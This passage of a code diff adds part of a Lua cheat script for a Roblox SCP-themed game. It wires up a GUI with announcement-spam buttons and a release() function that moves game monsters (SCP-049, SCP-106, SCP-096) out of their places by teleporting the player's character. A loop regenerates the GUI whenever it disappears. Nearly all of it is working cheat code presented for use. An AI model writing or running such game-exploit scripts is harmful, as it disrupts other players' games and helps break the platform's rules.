+com.Buttons.Announce.PlayOnce.BorderColor3 = Color3.fromRGB(192, 57, 43)
+
+com.Buttons.Announce.Spam.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+com.Buttons.Announce.Spam.BorderColor3 = Color3.fromRGB(192, 57, 43)
+
+com.Buttons.Announce.Manual.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+com.Buttons.Announce.Manual.BorderColor3 = Color3.fromRGB(39, 174, 96)
+end)
+
+com.Buttons.Announce.SDelay.MouseButton1Click:Connect(function()
+if tonumber(com.Buttons.Announce.TextBox.Text) ~= nil then
+globDelay = tonumber(com.Buttons.Announce.TextBox.Text)
+end
+end)
+
+function release(scp)
+tar = game.workspace[scp] --["SCP-049"] ["SCP-106"] ["SCP-096"]
+lastPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+game.Players.LocalPlayer.Character:MoveTo(Vector3.new(tar.Head.Position.X,tar.Head.Position.Y-9.9,tar.Head.Position.Z))
+wait(0.5)
+tar:MoveTo(lastPos)
+wait(0.1)
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+end
+
+for i,v in pairs(com.Buttons.SCP:GetChildren()) do
+v.MouseButton1Click:Connect(function()
+print(v.Text)
+release(v.Text)
+end)
+end
+
+
+
+end
+coroutine.resume(coroutine.create(SCRIPT_ZEDQ79_FAKESCRIPT))
+end
+
+function tryRegenSSTGUI()
+if game.Players.LocalPlayer.PlayerGui:findFirstChild("Site17GUI") == nil then
+RegenSSTGUI()
+end
+end
+
+while true do
+wait(0.1)
+    tryRegenSSTGUI()
+end
